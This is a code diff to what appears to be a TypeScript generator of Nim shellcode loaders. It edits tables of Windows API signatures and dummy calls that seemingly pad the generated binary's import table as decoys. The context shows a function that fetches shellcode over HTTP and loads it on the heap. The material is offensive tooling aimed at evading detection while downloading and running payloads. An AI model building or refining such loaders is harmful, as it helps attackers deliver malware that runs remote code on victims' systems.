@@ -132,56 +132,38 @@ proc fibonacci(n: int): string =
         if (iatFunctions.length === 0) return "";
 
         const functionSignatures: Record<string, string> = {
-            "GetForegroundWindow": "proc GetForegroundWindow*(): HWND {.stdcall, importc: \"GetForegroundWindow\".}",
             "GetActiveWindow": "proc GetActiveWindow*(): HWND {.stdcall, importc: \"GetActiveWindow\".}",
             "GetSystemMetrics": "proc GetSystemMetrics*(nIndex: int32): int32 {.stdcall, importc: \"GetSystemMetrics\".}",
             "IsWindowVisible": "proc IsWindowVisible*(hWnd: HWND): WINBOOL {.stdcall, importc: \"IsWindowVisible\".}",
             "MessageBoxW": "proc MessageBoxW*(hWnd: HWND, lpText, lpCaption: ptr uint16, uType: uint32): int32 {.stdcall, importc: \"MessageBoxW\".}",
-            "GetDesktopWindow": "proc GetDesktopWindow*(): HWND {.stdcall, importc: \"GetDesktopWindow\".}",
-            "FindWindowW": "proc FindWindowW*(lpClassName, lpWindowName: ptr uint16): HWND {.stdcall, importc: \"FindWindowW\".}",
-            "GetWindowTextW": "proc GetWindowTextW*(hWnd: HWND, lpString: ptr uint16, nMaxCount: int32): int32 {.stdcall, importc: \"GetWindowTextW\".}",
             "GetTickCount": "proc GetTickCount*(): uint32 {.stdcall, importc: \"GetTickCount\".}",
             "GetTickCount64": "proc GetTickCount64*(): uint64 {.stdcall, importc: \"GetTickCount64\".}",
             "GetFileType": "proc GetFileType*(hFile: HANDLE): uint32 {.stdcall, importc: \"GetFileType\".}",
-            "GetFileSize": "proc GetFileSize*(hFile: HANDLE, lpFileSizeHigh: ptr uint32): uint32 {.stdcall, importc: \"GetFileSize\".}",
             "GetCurrentProcessId": "proc GetCurrentProcessId*(): uint32 {.stdcall, importc: \"GetCurrentProcessId\".}",
             "GetCurrentThreadId": "proc GetCurrentThreadId*(): uint32 {.stdcall, importc: \"GetCurrentThreadId\".}",
-            "GetLocalTime": "proc GetLocalTime*(lpSystemTime: ptr SYSTEMTIME): void {.stdcall, importc: \"GetLocalTime\".}",
-            "GetComputerNameW": "proc GetComputerNameW*(lpBuffer: ptr uint16, nSize: ptr uint32): WINBOOL {.stdcall, importc: \"GetComputerNameW\".}",
-            "GetVersionExW": "proc GetVersionExW*(lpVersionInformation: ptr OSVERSIONINFOW): WINBOOL {.stdcall, importc: \"GetVersionExW\".}",
             "RegCloseKey": "proc RegCloseKey*(hKey: HKEY): int32 {.stdcall, importc: \"RegCloseKey\".}",
             "RegOpenKeyExW": "proc RegOpenKeyExW*(hKey: HKEY, lpSubKey: ptr uint16, ulOptions: uint32, samDesired: REGSAM, phkResult: ptr HKEY): int32 {.stdcall, importc: \"RegOpenKeyExW\".}",
             "RegQueryValueExW": "proc RegQueryValueExW*(hKey: HKEY, lpValueName: ptr uint16, lpReserved: ptr uint32, lpType: ptr uint32, lpData: ptr byte, lpcbData: ptr uint32): int32 {.stdcall, importc: \"RegQueryValueExW\".}",
             "SHGetFolderPathW": "proc SHGetFolderPathW*(hwnd: HWND, csidl: int32, hToken: HANDLE, dwFlags: uint32, pszPath: ptr uint16): HRESULT {.stdcall, importc: \"SHGetFolderPathW\".}",
-            "ShellExecuteW": "proc ShellExecuteW*(hwnd: HWND, lpOperation, lpFile, lpParameters, lpDirectory: ptr uint16, nShowCmd: int32): HINSTANCE {.stdcall, importc: \"ShellExecuteW\".}",
             "WSAStartup": "proc WSAStartup*(wVersionRequired: uint16, lpWSAData: ptr WSADATA): int32 {.stdcall, importc: \"WSAStartup\".}",
             "WSACleanup": "proc WSACleanup*(): int32 {.stdcall, importc: \"WSACleanup\".}",
             "gethostname": "proc gethostname*(name: cstring, namelen: int32): int32 {.stdcall, importc: \"gethostname\".}",
         };
 
         const functionCalls: Record<string, string> = {
-            "GetForegroundWindow": "discard GetForegroundWindow()",
             "GetActiveWindow": "discard GetActiveWindow()",
             "GetSystemMetrics": "discard GetSystemMetrics(0)",
             "IsWindowVisible": "discard IsWindowVisible(0)",
             "MessageBoxW": "# MessageBoxW not called (blocking)",
-            "GetDesktopWindow": "discard GetDesktopWindow()",
-            "FindWindowW": "discard FindWindowW(nil, nil)",
-            "GetWindowTextW": "discard GetWindowTextW(0, nil, 0)",
             "GetTickCount": "discard GetTickCount()",
             "GetTickCount64": "discard GetTickCount64()",
             "GetFileType": "discard GetFileType(0)",
-            "GetFileSize": "discard GetFileSize(0, nil)",
             "GetCurrentProcessId": "discard GetCurrentProcessId()",
             "GetCurrentThreadId": "discard GetCurrentThreadId()",
-            "GetLocalTime": "discard GetLocalTime(nil)",
-            "GetComputerNameW": "discard GetComputerNameW(nil, nil)",
-            "GetVersionExW": "discard GetVersionExW(nil)",
             "RegCloseKey": "discard RegCloseKey(0)",
             "RegOpenKeyExW": "discard RegOpenKeyExW(0, nil, 0, 0, nil)",
             "RegQueryValueExW": "discard RegQueryValueExW(0, nil, nil, nil, nil, nil)",
             "SHGetFolderPathW": "discard SHGetFolderPathW(0, 0, 0, 0, nil)",
-            "ShellExecuteW": "discard ShellExecuteW(0, nil, nil, nil, nil, 0)",
             "WSAStartup": "discard WSAStartup(0, nil)",
             "WSACleanup": "discard WSACleanup()",
             "gethostname": "discard gethostname(nil, 0)",
@@ -793,8 +775,6 @@ proc extractShellCodeWithHttp(): string =
         echo "Erreur HTTP: ", e.msg
         return ""
 
-func toByteSeq*(str: string): seq[byte] {.inline.} =
-  @(str.toOpenArrayByte(0, str.high))
 
 # Initialize shellcode on heap for HTTP
 let shellcodeStr = extractShellCodeWithHttp()
